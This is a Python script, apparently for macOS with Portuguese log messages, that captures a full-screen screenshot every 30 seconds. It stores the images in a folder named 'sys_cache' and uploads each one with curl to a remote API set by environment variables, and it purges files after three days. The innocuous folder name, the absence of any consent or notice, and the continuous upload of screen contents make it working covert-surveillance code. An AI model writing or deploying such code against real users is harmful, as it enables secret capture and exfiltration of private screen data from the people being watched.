import os
import time
import datetime
import sys
import logging
import subprocess
import pyautogui

BASE_DIR = os.path.expanduser("~/OneDrive/sys_cache")
IMG_DIR = os.path.join(BASE_DIR, "img")
COUNTER_FILE = os.path.join(BASE_DIR, "counter.txt")
STATUS_FILE = os.path.join(BASE_DIR, "status.txt")
LOG_FILE = os.path.join(BASE_DIR, "syscache.log")

INTERVAL = 30  # segundos
RETENTION_DAYS = 3
UPLOAD_API_URL = os.getenv("UPLOAD_API_URL", "").strip()
UPLOAD_API_TOKEN = os.getenv("UPLOAD_API_TOKEN", "").strip()


def create_dirs():
    os.makedirs(BASE_DIR, exist_ok=True)
    os.makedirs(IMG_DIR, exist_ok=True)


def setup_logging():
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )


def load_counter():
    if os.path.exists(COUNTER_FILE):
        try:
            with open(COUNTER_FILE, "r") as f:
                return int(f.read().strip())
        except:
            return 0
    return 0


def save_counter(counter):
    with open(COUNTER_FILE, "w") as f:
        f.write(str(counter))


def save_number(counter, timestamp):
    file_path = os.path.join(BASE_DIR, f"{timestamp}.txt")
    with open(file_path, "w") as f:
        f.write(str(counter))


def take_screenshot(timestamp):
    filepath = os.path.join(IMG_DIR, f"S_{timestamp}.png")
    ss = pyautogui.screenshot()
    ss.save(filepath)
    logging.info("Screenshot salva em %s", filepath)
    send_screenshot_to_api(filepath)


def send_screenshot_to_api(filepath):
    if not UPLOAD_API_URL:
        return

    cmd = [
        "curl",
        "-sS",
        "-X",
        "POST",
        UPLOAD_API_URL,
        "-F",
        f"file=@{filepath}",
    ]

    if UPLOAD_API_TOKEN:
        cmd.extend(["-H", f"Authorization: Bearer {UPLOAD_API_TOKEN}"])

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=False,
        )
        if result.returncode == 0:
            logging.info("Upload enviado com sucesso para API.")
        else:
            logging.error(
                "Falha no upload (%s): %s",
                result.returncode,
                (result.stderr or result.stdout).strip(),
            )
    except Exception as e:
        logging.exception("Erro ao executar curl para upload: %s", e)


def heartbeat():
    with open(STATUS_FILE, "w", encoding="utf-8") as f:
        f.write(datetime.datetime.now().isoformat())


def cleanup_old_files():
    now = time.time()
    cutoff = now - (RETENTION_DAYS * 86400)

    for root, _, files in os.walk(BASE_DIR):
        for file in files:
            path = os.path.join(root, file)

            if path in (COUNTER_FILE, STATUS_FILE, LOG_FILE):
                continue

            if os.path.isfile(path):
                if os.path.getmtime(path) < cutoff:
                    try:
                        os.remove(path)
                        logging.info("Arquivo removido: %s", path)
                    except Exception as e:
                        logging.error("Erro ao remover %s: %s", path, e)


def main_loop():
    counter = load_counter()

    while True:
        counter += 1
        timestamp = datetime.datetime.now().strftime("%Y_%m_%d-%H_%M_%S")

        save_number(counter, timestamp)
        take_screenshot(timestamp)
        save_counter(counter)
        heartbeat()
        cleanup_old_files()

        time.sleep(INTERVAL)


if __name__ == '__main__':
    try:
        create_dirs()
        setup_logging()
        logging.info("Iniciando main_script_mac")
        main_loop()
    except KeyboardInterrupt:
        logging.info("Finalizado por interrupção do usuário.")
        sys.exit(0)
